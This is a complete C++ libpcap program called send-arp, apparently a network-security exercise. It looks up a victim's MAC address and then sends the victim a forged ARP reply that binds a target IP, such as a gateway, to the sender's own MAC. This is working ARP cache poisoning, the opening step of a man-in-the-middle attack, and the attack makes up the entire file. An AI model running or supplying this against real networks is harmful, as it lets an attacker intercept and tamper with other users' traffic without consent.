#include "ethhdr.h"
#include "arphdr.h"
#include "stdafx.h"

#define IFNAMSIZ 16

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct Addresses {
	Mac mac;
	Ip ip;
};

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void log (char *msg, ...) {
	time_t now = time(0);
	va_list ap;
	va_start(ap, msg);
	fprintf(stderr, "%ld: ", now);
	vfprintf(stderr, msg, ap);
	fprintf(stderr, "\n");
}

uint8_t* _pcap_next(pcap_t* pcap) {
  pcap_pkthdr *pkt_header;
  const uint8_t *pkt_data;
  int res = pcap_next_ex(pcap, &pkt_header, &pkt_data);

  if (res == 0) return NULL;
  if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
    fprintf(stderr, "pcap_next_ex return %d - %s\n", res, pcap_geterr(pcap));
    exit(-1);
  }

  return (uint8_t*) pkt_data;
}

EthArpPacket* pcap_next_arp(pcap_t* pcap, Ip target_ip) {
	time_t started_at = time(0);

	for (int i =0;; i++) {
		time_t now = time(0);
		if (now > started_at + 2) {
    		fprintf(stderr, "reply timeout reached\n");
			exit(-1);
		}

		EthArpPacket *pkt = (EthArpPacket*) _pcap_next(pcap);
		if (pkt == NULL) continue;

		if (pkt->eth_.type() != pkt->eth_.Arp)
			continue;

		if (pkt->arp_.op() != pkt->arp_.Reply)
			continue;

		if (pkt->arp_.sip() != target_ip)
			continue;

		return pkt;
	}
}

Addresses get_my_addr (char* dev) {
    ifaddrs *ifAddrStruct = NULL;
    ifaddrs *ifa = NULL;

    getifaddrs(&ifAddrStruct);

	Ip ip;
	Mac mac;

    for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr)
			continue;

		if (strcmp(ifa->ifa_name, dev) != 0)
			continue;

        if (ifa->ifa_addr->sa_family == AF_INET) {
			char str[INET_ADDRSTRLEN];
			inet_ntop(AF_INET, &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr, str, INET_ADDRSTRLEN);
			log("My ip address found: %s", str);
            ip = Ip(str);
        } else if (ifa->ifa_addr->sa_family == AF_PACKET) {
			sockaddr_ll *s = (sockaddr_ll*)ifa->ifa_addr;
            int i;
            int len = 0;

			char str[INET6_ADDRSTRLEN];
            for(i = 0; i < 6; i++)
                len+=sprintf(str+len,"%02X%s",s->sll_addr[i],i < 5 ? ":":"");
			
			log("My mac address found: %s", str);
			mac = Mac(str);
        } 
    }

    if (ifAddrStruct!=NULL) freeifaddrs(ifAddrStruct);

	return Addresses{mac, ip};
}

void arp_send (pcap_t* handle, uint16_t op_code, Mac src_mac, Mac dest_mac, Mac target_mac, Ip src_ip, Ip target_ip) {
	EthArpPacket packet;

	packet.eth_.smac_ = src_mac;
	packet.eth_.dmac_ = dest_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(op_code);
	packet.arp_.smac_ = src_mac;
	packet.arp_.sip_ = htonl(src_ip);
	packet.arp_.tmac_ = target_mac;
	packet.arp_.tip_ = htonl(target_ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

Mac arp_query (pcap_t* handle, Mac source_mac, Ip source_ip, Ip target_ip) {
	arp_send(handle, ArpHdr::Request, source_mac, Mac::broadcastMac(), Mac::nullMac(), source_ip, target_ip);
	EthArpPacket *pkt = pcap_next_arp(handle, target_ip);
	return pkt->arp_.smac_;
}

int main(int argc, char** argv) {
	if (argc < 4 || argc % 2) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Addresses my_info = get_my_addr(dev);

	for (int i = 1; i < argc - 1;) {
		Ip sender_ip = Ip(argv[++i]);
		Ip target_ip = Ip(argv[++i]);

		log("Querying mac address of %s...", ((std::string)sender_ip).c_str());

		Mac sender_mac = arp_query(handle, my_info.mac, my_info.ip, sender_ip);

		log("%s's mac address found: %s", ((std::string)sender_ip).c_str(), ((std::string)sender_mac).c_str());
		
		arp_send(handle, ArpHdr::Reply, my_info.mac, sender_mac, sender_mac, target_ip, sender_ip);
		log("Sent fake arp reply to %s", ((std::string)sender_ip).c_str());
	}
	
	pcap_close(handle);
}
